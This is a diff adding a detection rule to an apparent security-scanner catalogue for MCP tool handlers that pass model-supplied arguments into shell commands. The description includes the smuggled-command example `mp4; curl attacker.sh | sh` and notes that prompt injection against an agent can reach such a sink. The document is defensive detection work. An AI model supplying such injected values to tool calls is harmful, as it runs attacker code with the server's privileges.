@@ -5810,6 +5810,35 @@
       "title": "tumf mcp-text-editor path traversal (affected up to 1.0.2)"
     },
     {
+      "adversa_references": [
+        "ADV-INJECT-04"
+      ],
+      "aicm_references": [
+        "AIS-08",
+        "IVS-04"
+      ],
+      "auto_fixable": false,
+      "category": "tool-poisoning",
+      "cve_references": [
+        "CVE-2026-78430"
+      ],
+      "description": "An MCP tool handler builds a shell command string out of a value that arrives in the tool-call arguments object, then hands that string to a process API \u2014 `child_process.exec` / `execSync`, or `spawn` / `execFile` with `shell: true`. Because the string is composed at the call site (a template literal with `${...}`, or a concatenation) the argument is parsed by a shell, so a value such as `mp4; curl attacker.sh | sh` runs as a second command. This is the shape of CVE-2026-78430 (`mcp-ffmpeg-helper` 0.1.0 / 0.1.1 / 0.2.1, `handleToolCall` in `src/tools/handlers.ts`, CWE-77/CWE-78), which carries a CVSS 3.1 base of only 5.3 because the vector requires a local attacker \u2014 but in an agent pipeline the local caller IS the model, and any upstream prompt injection reaches this sink with the server's own privileges, which is why this rule is CRITICAL rather than MEDIUM. The surface is the handler, not the launcher: `AAK-MCP-002` and the `AAK-MCP-STDIO-CMD-INJ-*` family inspect the configured server command before the process starts, whereas this fires on the request path. Detection is a TypeScript/JavaScript source pattern and is deliberately narrower than `AAK-TAINT-001`, which reports any `child_process` call in an MCP file without checking how the command was built; where this rule fires, that one is suppressed on the same line so one defect is reported once.",
+      "incident_references": [],
+      "limitations": "",
+      "owasp_agentic_references": [
+        "ASI05"
+      ],
+      "owasp_ast_references": [],
+      "owasp_mcp_references": [
+        "MCP04:2025"
+      ],
+      "remediation": "Pass arguments as an argv array to the process API and never as a composed shell string: `execFile('ffmpeg', ['-i', input, '-f', format])` rather than `exec(`ffmpeg -i ${input} -f ${format}`)`, and leave `shell` unset (it defaults to false). Validate the argument against an allowlist of expected values before it reaches the process boundary \u2014 for a codec or container format that is a fixed, short list, so an allowlist is exact rather than a filter that has to anticipate every metacharacter.",
+      "rule_id": "AAK-MCP-TOOL-ARG-OSCMD-001",
+      "sarif_name": "McpToolArgOsCommand",
+      "severity": "critical",
+      "title": "Tool handler passes a model-supplied argument into an OS command"
+    },
+    {
       "adversa_references": [],
       "aicm_references": [
         "AIS-08",
